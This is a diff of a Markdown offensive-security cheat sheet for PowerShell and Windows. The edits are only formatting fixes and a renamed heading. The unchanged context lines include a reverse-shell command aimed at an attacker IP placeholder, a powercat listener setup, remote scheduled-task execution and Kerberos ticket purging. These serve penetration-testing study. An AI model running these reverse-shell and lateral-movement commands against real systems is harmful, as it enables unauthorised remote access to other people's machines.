@@ -32,12 +32,12 @@ Get-command -CommandType cmdlet - List all cmdlets
 ```
 
 **Use this parameter to not print errors powershell**\
-****-ErrorAction SilentlyContinue
+\-ErrorAction SilentlyContinue
 
 **Rename powershell windows**\
-****$host.ui.RawUI.WindowTitle = "name"&#x20;
+$host.ui.RawUI.WindowTitle = "name"&#x20;
 
-### Execute
+### Execution Policy
 
 It is NOT a security boundary
 
@@ -201,7 +201,7 @@ Invoke-PowershellTcp -Reverse -IPAddress attackersIP -Port port
 ## Other
 
 **Display/delete Kerberos Tickets**\
-****klist\
+klist\
 klist purge
 
 **List tasks**\
@@ -217,12 +217,12 @@ schtasks /Run /S hostname.dom.local /TN "STCheck"
 {% endcode %}
 
 **Start listener**\
-****. .\powercat.ps1\
+. .\powercat.ps1\
 powercat -l -v -p 443 -t 1000\
 &#x20; When connected press a few times enter
 
 **HFS Webserver tool**\
-****Drag & drop files in window to host it
+Drag & drop files in window to host it
 
 **List tasks**\
 tasklist /v
